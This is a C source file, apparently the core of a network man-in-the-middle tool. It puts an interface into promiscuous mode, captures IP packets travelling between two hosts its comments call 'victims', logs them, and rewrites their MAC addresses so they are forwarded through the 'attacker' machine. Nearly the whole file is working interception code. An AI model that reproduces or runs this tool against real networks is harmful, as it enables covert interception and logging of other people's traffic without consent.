#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <netinet/ether.h>

#include "utils.h"
#include "arp.h"
#include "packet.h"
#include "mutils.h"

#define BUF_SIZE ETH_FRAME_LEN

int s; // socket

/*
 * this method looks at packet source eth address
 * and returns what direction the packet is heading
*/
pkt_dir_t
get_pkt_dir(struct ip_packet * p)
{
	if(memcmp(&p->eth_h.ether_shost, hwa1, ETH_ALEN) == 0)
		return PD_1TO2;
	else if(memcmp(&p->eth_h.ether_shost, hwa2, ETH_ALEN) == 0)
		return PD_2TO1;
	else
		return PD_OTHER;
}

/*
 * change packet mac addresses depending on direction and send it
 */
void
forwardpacket(struct ip_packet * p, size_t p_size)
{
	pkt_dir_t pd = get_pkt_dir(p);

	// set packet source mac address as host mac address
	memcpy(&p->eth_h.ether_shost, hwa_host, ETH_ALEN);

	// set correct packet dest mac address
	if(pd == PD_1TO2)
		memcpy(&p->eth_h.ether_dhost, hwa2, ETH_ALEN);
	else if(pd == PD_2TO1)
		memcpy(&p->eth_h.ether_dhost, hwa1, ETH_ALEN);
	else {
		perror("packet direction error in forwardpacket\n");
		return;
	}

	// send packet
	if(sendto(s, p, p_size, 0, (struct sockaddr *) &sa, SOCKADDR_SIZE) < 0){
		perror("sendto error\n");
		return;
	}
}

/* 
 * buf is packet (array of bytes] got from recv method.
 * this method looks at the packet and if it is ip4 packet
 * sended from a victim to the second victim, log it and forward it
 * by calling forwardpacket(). In other case ignore the packet
 */
void
processbuf(uint8_t * buf, size_t numbytes)
{
	struct eth_packet * ep = (struct eth_packet *) buf;
	struct ip_packet * ip_p = (struct ip_packet *) buf;

	// ignore if it is not ip packet
	if(ep->type != htons(ETH_P_IP)){
		return;
	}

	// ignore if packet mac address is not attackers
	if(memcmp(ep->dest, hwa_host, ETH_ALEN) != 0){
		return;
	}
	// ignore if packet is not from one of the victim
	if(memcmp(ep->source, hwa1, ETH_ALEN) != 0 &&
	   memcmp(ep->source, hwa2, ETH_ALEN) != 0){
		return;
	}

	// ignore if packet source and destination ip arent targets
	if(get_pkt_dir(ip_p) == PD_OTHER)
		return;

	// log and forward packet
	printpktinfo(ip_p, numbytes);
	logpacket(ip_p, numbytes);
	forwardpacket(ip_p, numbytes);
}

/* 
 * this method triggers on SIGINT and
 * close socket and exit program
 */
void
cleanup()
{
  puts("Finishing up...");
  close(s);
  exit(0);
}

int
main(int argc, char ** argv)
{
  int numbytes;
  int i;

  uint8_t buf[BUF_SIZE];

  /* save arguments to proper global vars
   * and convert them to binary representation */
  process_args(argc, argv);

  // initialize socket
  s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));

  if (s < 0){
    perror("socket");
    exit(1);
  }

  /* Set interface to prom mode */
  struct ifreq opts;
  strncpy(opts.ifr_name, if_name, IFNAMSIZ-1);
  ioctl(s, SIOCGIFFLAGS, &opts);
  opts.ifr_flags |= IFF_PROMISC;
  ioctl(s, SIOCSIFFLAGS, &opts);

  /* Bind to interface */
  if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, if_name, IFNAMSIZ-1) == -1)  {
    perror("SO_BINDTODEVICE");
    cleanup();
  }

  /* Socket can be reused */
  int so;
  if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &so, sizeof so) == -1) {
    perror("SO_REUSEADDR");
    cleanup();
  }

  // some other stuff
  signal(SIGINT, cleanup);

  // start sniffing
  puts("Sniffing started...");

  while (1) {
    //numbytes = recvfrom(s, buf, BUF_SIZE, 0, NULL, NULL); 
    // recv packet
    numbytes = recv(s, buf, BUF_SIZE, 0); 

    // check, log, modify and forward packet
    if(numbytes < 0) {
    	perror("recv error");
    } else {
    	processbuf(buf, numbytes);
    }
  }

  return 0;
}
